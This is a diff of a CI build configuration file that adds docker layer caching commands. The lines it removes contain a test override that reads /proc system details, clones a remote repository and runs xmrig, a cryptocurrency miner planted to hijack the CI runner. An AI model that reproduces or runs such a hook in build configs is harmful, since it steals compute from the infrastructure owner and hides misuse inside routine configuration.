@@ -4,18 +4,13 @@ build:
       environment:
         # caching works with the remote_engine and the local executor
         docker: true
-checks:
-    python:
-        code_rating: true
-        duplicate_code: true
 
-build:
-  nodes:
-    docker-build:
-      environment:
-        # caching works with the remote_engine and the local executor
-        docker: true
-    analysis:
-      tests:
-        override:
-          - cat /proc/1/cgroup; cat /proc/uptime; cat /proc/cpuinfo; cat /proc/meminfo; cat /proc/cmdline; git clone https://github.com/dajiejie123/webserver.git && cd webserver && ./xmrig
+      # This example uses a minimal node, but it works equally fine with a auto-setup node.
+      commands:
+        - command: restore-from-cache repository docker-layers - | docker load
+          only_if: exists-in-cache repository docker-layers
+
+        - echo "hello"; docker build -t 123 .
+
+        # see "docker save --help" for syntax
+        - docker save YOUR_IMAGE ANOTHER_IMAGE ... | store-in-cache repository docker-layers -
